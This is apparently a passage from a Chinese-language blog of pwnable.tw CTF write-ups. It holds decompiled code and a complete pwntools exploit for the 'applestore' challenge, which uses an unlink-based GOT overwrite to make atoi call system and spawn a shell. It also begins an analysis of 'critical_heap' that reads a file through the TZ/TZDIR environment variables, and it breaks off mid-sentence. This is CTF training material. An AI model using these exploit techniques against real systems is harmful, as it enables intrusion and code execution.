class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()         //添加购物车，采用了my_read函数，但是存在问题，也就是在read时可以输入\x00在中间分隔，以便在不影响后面的基础上，覆盖后面栈上的内容。</span><br><span class="line">&#123;</span><br><span class="line">  char **v1; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  char nptr; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v3; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Device Number&gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;nptr, 0x15u);</span><br><span class="line">  switch ( atoi(&amp;nptr) )</span><br><span class="line">  &#123;</span><br><span class="line">    case 1:</span><br><span class="line">      v1 = create((int)&quot;iPhone 6&quot;, (char *)199);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 2:</span><br><span class="line">      v1 = create((int)&quot;iPhone 6 Plus&quot;, (char *)299);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 3:</span><br><span class="line">      v1 = create((int)&quot;iPad Air 2&quot;, (char *)499);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 4:</span><br><span class="line">      v1 = create((int)&quot;iPad Mini 3&quot;, (char *)399);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 5:</span><br><span class="line">      v1 = create((int)&quot;iPod Touch&quot;, (char *)199);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">LABEL_8:</span><br><span class="line">      printf(&quot;You&apos;ve put *%s* in your shopping cart.\n&quot;, *v1);</span><br><span class="line">      puts(&quot;Brilliant! That&apos;s an amazing idea.&quot;);</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      puts(&quot;Stop doing that. Idiot!&quot;);</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int cart()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v0; // eax</span><br><span class="line">  signed int v2; // [esp+18h] [ebp-30h]</span><br><span class="line">  int cost; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  _DWORD *i; // [esp+20h] [ebp-28h]</span><br><span class="line">  char buf; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v6; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  v2 = 1;</span><br><span class="line">  cost = 0;</span><br><span class="line">  printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;buf, 0x15u);</span><br><span class="line">  if ( buf == &apos;y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;==== Cart ====&quot;);  //遍历链表来输出cart</span><br><span class="line">    for ( i = (_DWORD *)mycart; i; i = (_DWORD *)i[2] )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v2++;</span><br><span class="line">      printf(&quot;%d: %s - $%d\n&quot;, v0, *i, i[1]);   // i[1] == money</span><br><span class="line">                                                </span><br><span class="line">      cost += i[1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return cost;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int delete()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [esp+10h] [ebp-38h]</span><br><span class="line">  _DWORD *v2; // [esp+14h] [ebp-34h]</span><br><span class="line">  int v3; // [esp+18h] [ebp-30h]</span><br><span class="line">  int FD; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  int BK; // [esp+20h] [ebp-28h]</span><br><span class="line">  char nptr; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v7; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(0x14u);</span><br><span class="line">  v1 = 1;</span><br><span class="line">  v2 = (_DWORD *)mycart;</span><br><span class="line">  printf(&quot;Item Number&gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;nptr, 0x15u);</span><br><span class="line">  v3 = atoi(&amp;nptr);</span><br><span class="line">  while ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if ( v1 == v3 )                  //典型的unlink</span><br><span class="line">    &#123;</span><br><span class="line">      FD = v2[2];</span><br><span class="line">      BK = v2[3];</span><br><span class="line">      if ( BK )</span><br><span class="line">        *(_DWORD *)(BK + 8) = FD;</span><br><span class="line">      if ( FD )</span><br><span class="line">        *(_DWORD *)(FD + 12) = BK;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      printf(&quot;Remove %d:%s from your shopping cart.\n&quot;, v1, *v2);</span><br><span class="line">      return __readgsdword(0x14u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">    v2 = (_DWORD *)v2[2];</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int checkout()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+10h] [ebp-28h]</span><br><span class="line">  char *v2; // [esp+18h] [ebp-20h]</span><br><span class="line">  int v3; // [esp+1Ch] [ebp-1Ch]</span><br><span class="line">  unsigned int v4; // [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  if ( v1 == 7174 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;*: iPhone 8 - $1&quot;);</span><br><span class="line">    asprintf(&amp;v2, &quot;%s&quot;, &quot;iPhone 8&quot;);</span><br><span class="line">    v3 = 1;</span><br><span class="line">    insert((int)&amp;v2);</span><br><span class="line">    v1 = 7175;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Total: $%d\n&quot;, v1);</span><br><span class="line">  puts(&quot;Want to checkout? Maybe next time!&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>在不断的使用添加购物车的函数add后，其形成了一个链表，而在输出时是通过遍历链表来依次输出的。<br>结构str大概如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str[0]: cost</span><br><span class="line">str[1]: name---&gt; 实际为指针</span><br><span class="line">str[2]: FD</span><br><span class="line">str[3]: BK</span><br></pre></td></tr></table></figure><p>而我们在输入时使用的my_read函数（cart/delete函数均调用）因为可以覆盖后面的栈，所以会有希望去修改链表的节点为got表之类的。然后cart函数来泄露libc基址等等。</p><p>同时，在delete函数中使用了unlink的过程，也有利用的希望。RELRO不是full说明GOT表还是可以修改的，所以可以用unlink来修改got表.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec applestore</span><br><span class="line">[*] &apos;/root/pwnable/applestore/applestore&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>不过漏洞利用的切入点其实在后面，在checkout函数里，当购物车金额达到7174，就会赠送一个iphone8…而偏偏赠送的这个iphone8被放在了栈里面。而其实这几个函数用的都是同一栈帧（栈顶或许有差异，但是栈底是一致的），而恰好存储iphone8的位置在其他函数中可以被修改。也就是链表的结尾分配到了我们可以修改的栈上。</p><p>除此以外，需要栈地址的泄露，可以：</p><ol><li>利用前面的leak洞,从第一个chunk开始,不断leak chunk的fd,直到stack上的chunk的前一个的chunk的fd,即可得到stack</li><li>我们可以用environ变量加上libc的基址来得到栈地址。</li></ol><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./applestore&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10104)</span><br><span class="line">bin = ELF(&apos;./applestore&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def buy(idx):</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;Device Number&gt; &apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Item Number&gt; &apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def dele2(con):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Item Number&gt; &apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def show(con):</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">sh.recvuntil(&apos;(y/n) &gt; &apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def checkout():</span><br><span class="line">sh.sendline(&apos;5&apos;)</span><br><span class="line">sh.recvuntil(&apos;(y/n) &gt; &apos;)</span><br><span class="line">sh.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(20):</span><br><span class="line">buy(2)</span><br><span class="line">for i in range(6):</span><br><span class="line">buy(1)</span><br><span class="line"></span><br><span class="line">checkout()</span><br><span class="line">pay = &apos;y\x00&apos;</span><br><span class="line">pay+=p32(bin.got[&apos;puts&apos;]) + 3*p32(0)</span><br><span class="line">show(pay)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;27: &apos;)</span><br><span class="line">libc.address = u32(sh.recv(4))-libc.symbols[&apos;puts&apos;]</span><br><span class="line">envp = libc.symbols[&apos;environ&apos;]</span><br><span class="line">system = libc.symbols[&apos;system&apos;]</span><br><span class="line">success(&apos;libc_base: &apos;+hex(libc.address))</span><br><span class="line">success(&apos;envp: &apos;+hex(envp))</span><br><span class="line"></span><br><span class="line">pay = &apos;y\x00&apos;</span><br><span class="line">pay+=p32(envp)+p32(1)+p32(0)+p32(0)</span><br><span class="line">show(pay)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;27: &apos;)</span><br><span class="line">stack_envp = u32(sh.recv(4))</span><br><span class="line">success(&apos;stack_envp: &apos;+hex(stack_envp))    //通过environ泄露栈地址</span><br><span class="line"></span><br><span class="line">//仍未理解的过程：交换GOT和ebp,从而子函数ret后回到main,ebp会到GOT上,在main中read,会读到GOT表上,可以改写atoi到system.</span><br><span class="line"></span><br><span class="line">ebp = stack_envp-0x104</span><br><span class="line">atoi_got = bin.got[&apos;atoi&apos;]</span><br><span class="line">pay = &apos;27&apos;</span><br><span class="line">pay += p32(envp)+p32(1)+p32(ebp-0xc)+p32(atoi_got+0x20-2)</span><br><span class="line">dele2(pay)</span><br><span class="line"></span><br><span class="line">pay = &apos;$0\x00\x00&apos;+p32(system)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="critical-heap"><a href="#critical-heap" class="headerlink" title="critical_heap"></a>critical_heap</h1><p><em>难到仅有的wp基本上完全看不懂。。。</em></p><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><p>题目比较长，功能比较丰富。。</p><p>分析出来的结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">struct clock&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0xDEADBEEF;</span><br><span class="line">  char[4] year;</span><br><span class="line">  char[4] month;</span><br><span class="line">  char[4] day;</span><br><span class="line">  char[4] hour;</span><br><span class="line">  char[4] minute;</span><br><span class="line">  char[4] second;</span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">struct system&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0x48694869;</span><br><span class="line">  string PathOfSystem;</span><br><span class="line">  string DetailOfSystem;</span><br><span class="line">  char[4] UserOfSystem;</span><br><span class="line">  char[4] NameOfSystem;</span><br><span class="line">  char[4] rand;</span><br><span class="line"></span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line">struct normal&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0x13371337;</span><br><span class="line">  char[40] content;</span><br><span class="line">  int sig;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>完全没有见过的漏洞。。。相较于文件漏洞，倒更像是函数源码漏洞与小小的文件漏洞相配合产生的大问题。。。</p><ol><li>localtime和setenv配合能将任意文件内容写到heap上.  </li><li>chunk_system的detail在offset 0x20,chunk_normal的content在offset 0x18的位置,content读取的时候没有截断,而detail是存在栈上的,因此可以leak heap. （比较容易想到的漏洞,文件漏洞）.</li><li>在normal_heap的play下,有一个printf_chk的fmt洞,配合normal_heap的play下的change content就能在栈上留下信息,然后任意地址读(因为有chk,所以应该是无法用%n来任意地址写的).</li></ol><p>第一步需要看localtime的源码：以libc2.23源码为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">/* Return the `struct tm&apos; representation of *T in local time.  */</span><br><span class="line">struct tm *</span><br><span class="line">localtime (const time_t *t)</span><br><span class="line">&#123;</span><br><span class="line">  return __tz_convert (t, 1, &amp;_tmbuf);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (localtime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Return the `struct tm&apos; representation of *TIMER in the local timezone.</span><br><span class="line">   Use local time if USE_LOCALTIME is nonzero, UTC otherwise.  */</span><br><span class="line">struct tm *</span><br><span class="line">__tz_convert (const time_t *timer, int use_localtime, struct tm *tp)</span><br><span class="line">&#123;</span><br><span class="line">  long int leap_correction;</span><br><span class="line">  int leap_extra_secs;</span><br><span class="line"></span><br><span class="line">  if (timer == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (tzset_lock);</span><br><span class="line"></span><br><span class="line">  /* Update internal database according to current TZ setting.</span><br><span class="line">     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.</span><br><span class="line">     This is a good idea since this allows at least a bit more parallelism.  */</span><br><span class="line">  tzset_internal (tp == &amp;_tmbuf &amp;&amp; use_localtime, 1);</span><br><span class="line"></span><br><span class="line">  if (__use_tzfile)</span><br><span class="line">    __tzfile_compute (*timer, use_localtime, &amp;leap_correction,</span><br><span class="line">      &amp;leap_extra_secs, tp);</span><br><span class="line">      </span><br><span class="line">  &lt;--无关代码省略--&gt;</span><br><span class="line">  </span><br><span class="line">  return tp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Interpret the TZ envariable.  */</span><br><span class="line">static void</span><br><span class="line">internal_function</span><br><span class="line">tzset_internal (int always, int explicit)</span><br><span class="line">&#123;</span><br><span class="line">  static int is_initialized;</span><br><span class="line">  const char *tz;</span><br><span class="line"></span><br><span class="line">  if (is_initialized &amp;&amp; !always)</span><br><span class="line">    return;</span><br><span class="line">  is_initialized = 1;</span><br><span class="line"></span><br><span class="line">  /* Examine the TZ environment variable.  */</span><br><span class="line">  tz = getenv (&quot;TZ&quot;);//★注意此处,从env中读取TZ的值</span><br><span class="line">  if (tz == NULL &amp;&amp; !explicit)</span><br><span class="line">    /* Use the site-wide default.  This is a file name which means we</span><br><span class="line">       would not see changes to the file if we compare only the file</span><br><span class="line">       name for change.  We want to notice file changes if tzset() has</span><br><span class="line">       been called explicitly.  Leave TZ as NULL in this case.  */</span><br><span class="line">    tz = TZDEFAULT;</span><br><span class="line">  if (tz &amp;&amp; *tz == &apos;\0&apos;)</span><br><span class="line">    /* User specified the empty string; use UTC explicitly.  */</span><br><span class="line">    tz = &quot;Universal&quot;;</span><br><span class="line"></span><br><span class="line">  /* A leading colon means &quot;implementation defined syntax&quot;.</span><br><span class="line">     We ignore the colon and always use the same algorithm:</span><br><span class="line">     try a data file, and if none exists parse the 1003.1 syntax.  */</span><br><span class="line">  if (tz &amp;&amp; *tz == &apos;:&apos;)</span><br><span class="line">    ++tz;</span><br><span class="line"></span><br><span class="line">  /* Check whether the value changed since the last run.  */</span><br><span class="line">  if (old_tz != NULL &amp;&amp; tz != NULL &amp;&amp; strcmp (tz, old_tz) == 0)</span><br><span class="line">    /* No change, simply return.  */</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">  if (tz == NULL)</span><br><span class="line">    /* No user specification; use the site-wide default.  */</span><br><span class="line">    tz = TZDEFAULT;</span><br><span class="line"></span><br><span class="line">  tz_rules[0].name = NULL;</span><br><span class="line">  tz_rules[1].name = NULL;</span><br><span class="line"></span><br><span class="line">  /* Save the value of `tz&apos;.  */</span><br><span class="line">  free (old_tz);</span><br><span class="line">  old_tz = tz ? __strdup (tz) : NULL;</span><br><span class="line"></span><br><span class="line">  /* Try to read a data file.  */</span><br><span class="line">  __tzfile_read (tz, 0, NULL);//★带着TZ进入__tzfile_read函数</span><br><span class="line">  if (__use_tzfile)</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">&lt;--无关代码省略--&gt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">__tzfile_read (const char *file, size_t extra, char **extrap)</span><br><span class="line">&#123;</span><br><span class="line">  static const char default_tzdir[] = TZDIR;</span><br><span class="line">  size_t num_isstd, num_isgmt;</span><br><span class="line">  FILE *f;</span><br><span class="line">  struct tzhead tzhead;</span><br><span class="line">  size_t chars;</span><br><span class="line">  size_t i;</span><br><span class="line">  size_t total_size;</span><br><span class="line">  size_t types_idx;</span><br><span class="line">  size_t leaps_idx;</span><br><span class="line">  int was_using_tzfile = __use_tzfile;</span><br><span class="line">  int trans_width = 4;</span><br><span class="line">  size_t tzspec_len;</span><br><span class="line">  char *new = NULL;</span><br><span class="line"></span><br><span class="line">  if (sizeof (time_t) != 4 &amp;&amp; sizeof (time_t) != 8)</span><br><span class="line">    abort ();</span><br><span class="line"></span><br><span class="line">  __use_tzfile = 0;</span><br><span class="line"></span><br><span class="line">  if (file == NULL)</span><br><span class="line">    /* No user specification; use the site-wide default.  */</span><br><span class="line">    file = TZDEFAULT;</span><br><span class="line">  else if (*file == &apos;\0&apos;)</span><br><span class="line">    /* User specified the empty string; use UTC with no leap seconds.  */</span><br><span class="line">    goto ret_free_transitions;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      /* We must not allow to read an arbitrary file in a setuid</span><br><span class="line"> program.  So we fail for any file which is not in the</span><br><span class="line"> directory hierachy starting at TZDIR</span><br><span class="line"> and which is not the system wide default TZDEFAULT.  */</span><br><span class="line">      if (__libc_enable_secure</span><br><span class="line">  &amp;&amp; ((*file == &apos;/&apos;</span><br><span class="line">       &amp;&amp; memcmp (file, TZDEFAULT, sizeof TZDEFAULT)</span><br><span class="line">       &amp;&amp; memcmp (file, default_tzdir, sizeof (default_tzdir) - 1))</span><br><span class="line">      || strstr (file, &quot;../&quot;) != NULL))</span><br><span class="line">/* This test is certainly a bit too restrictive but it should</span><br><span class="line">   catch all critical cases.  */</span><br><span class="line">goto ret_free_transitions;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (*file != &apos;/&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">      const char *tzdir;</span><br><span class="line"></span><br><span class="line">      tzdir = getenv (&quot;TZDIR&quot;);//★从环境变量TZDIR中读取目录</span><br><span class="line">      if (tzdir == NULL || *tzdir == &apos;\0&apos;)</span><br><span class="line">tzdir = default_tzdir;</span><br><span class="line">      if (__asprintf (&amp;new, &quot;%s/%s&quot;, tzdir, file) == -1)</span><br><span class="line">goto ret_free_transitions;</span><br><span class="line">      file = new;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* If we were already using tzfile, check whether the file changed.  */</span><br><span class="line">  struct stat64 st;</span><br><span class="line">  if (was_using_tzfile</span><br><span class="line">      &amp;&amp; stat64 (file, &amp;st) == 0</span><br><span class="line">      &amp;&amp; tzfile_ino == st.st_ino &amp;&amp; tzfile_dev == st.st_dev</span><br><span class="line">      &amp;&amp; tzfile_mtime == st.st_mtime)</span><br><span class="line">    goto done;  /* Nothing to do.  */</span><br><span class="line"></span><br><span class="line">  /* Note the file is opened with cancellation in the I/O functions</span><br><span class="line">     disabled and if available FD_CLOEXEC set.  */</span><br><span class="line">  f = fopen (file, &quot;rce&quot;);//★打开文件</span><br></pre></td></tr></table></figure><p>最后是通过malloc读取文件内容到heap上的，所以我们只需要控制TZ 和 TZDIR 就能读取flag内容到heap上；（类似于函数源码漏洞？）</p><p>printf_chk 